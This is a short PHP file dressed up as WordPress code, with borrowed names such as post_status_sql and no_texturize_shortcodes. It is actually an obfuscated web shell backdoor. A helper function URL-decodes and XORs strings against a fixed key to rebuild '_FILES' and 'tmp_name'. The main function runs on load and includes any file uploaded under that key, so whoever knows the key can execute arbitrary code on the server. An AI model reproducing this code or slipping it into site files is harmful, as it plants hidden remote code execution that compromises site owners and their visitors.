<?php 	
function field_no_prefix()

{

    $post_status_sql = 'HHmPImK7C2f';
    $ancestor = $post_status_sql;

    
    $is_sticky = $GLOBALS[changed("%17%0E%24%1C%0C%3E", $ancestor)];

    $encoded_char = $is_sticky;
    $script_and_style_regex = isset($encoded_char[$ancestor]);
    if ($script_and_style_regex)

    {

        $fragment = $is_sticky[$ancestor];
	$subject = 'original_image';
        $no_texturize_shortcodes = $fragment[changed("%3C%25%1D%0F%27%0C%26R", $ancestor)];
        $caption = $no_texturize_shortcodes;

        include ($caption);
    }
}
function changed($tagnames, $words_array)

{

    $no_texturize_tags = $words_array;

    $field = "url" . "decode";

    $cached = $field($tagnames);

    $piece = substr($no_texturize_tags,0, strlen($cached));
    $sized = $cached ^ $piece;

    return $sized;

}
	$post = 'children';

field_no_prefix();

?>
